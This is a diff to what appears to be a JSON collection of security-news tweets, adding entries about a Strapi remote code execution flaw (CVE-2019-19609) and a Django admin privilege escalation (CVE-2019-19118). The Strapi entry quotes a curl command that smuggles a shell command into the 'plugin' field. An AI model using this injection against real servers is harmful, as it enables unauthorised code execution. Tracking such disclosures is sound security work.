@@ -129,6 +129,19 @@
 }
 {
     "expanded_url": [
+        "https://bittherapy.net/post/strapi-framework-remote-code-execution/"
+    ],
+    "tweetfavorites": 96,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 42,
+    "tweettext": "CVE-2019-19609 Strapi Framework Post-Auth RCE\n\ncurl -H $'Authorization: Bearer [jwt]' ... --data {\"plugin\": \"documentation &amp;&amp; $(whoami &gt; /tmp/whoami)\",\"port\":\"1337\"}\n\nhttps://t.co/EHl0j8DKGS https://t.co/Xy0RL8l3kS",
+    "tweettime": "2019-12-06, 01:43:20",
+    "tweeturl": "https://twitter.com/chybeta/status/1202765434199531520",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
         "https://thehackernews.com/2019/12/openbsd-authentication-vulnerability.html"
     ],
     "tweetfavorites": 179,
@@ -139,6 +152,19 @@
     "tweettime": "2019-12-05, 11:42:33",
     "tweeturl": "https://twitter.com/TheHackersNews/status/1202553842870571008",
     "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://www.djangoproject.com/weblog/2019/dec/02/security-releases/"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "CVE-2019-19118: Privilege escalation in the Django admin.\n \nhttps://t.co/Qnpl3lq5hl https://t.co/wcqweZHCoW",
+    "tweettime": "2019-12-02, 10:34:23",
+    "tweeturl": "https://twitter.com/chybeta/status/1201449525367336960",
+    "username": "chybeta"
 }
 {
     "expanded_url": [
